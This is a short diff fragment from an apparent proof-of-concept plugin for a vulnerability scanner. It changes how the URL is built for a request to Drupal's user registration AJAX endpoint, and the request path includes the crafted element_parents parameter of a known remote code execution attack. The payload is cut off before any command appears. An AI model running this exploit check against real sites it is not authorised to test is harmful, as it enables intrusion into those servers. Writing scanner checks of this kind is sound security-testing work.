@@ -30,7 +30,7 @@ class DemoPOC(POCBase):
     def _verify(self):
         result = {}
         flag = random_str(length=10)
-        url = self.url + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+        url = self.url.rstrip('/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
         payload = {
             'form_id': 'user_register_form',
             '_drupal_ajax': '1',
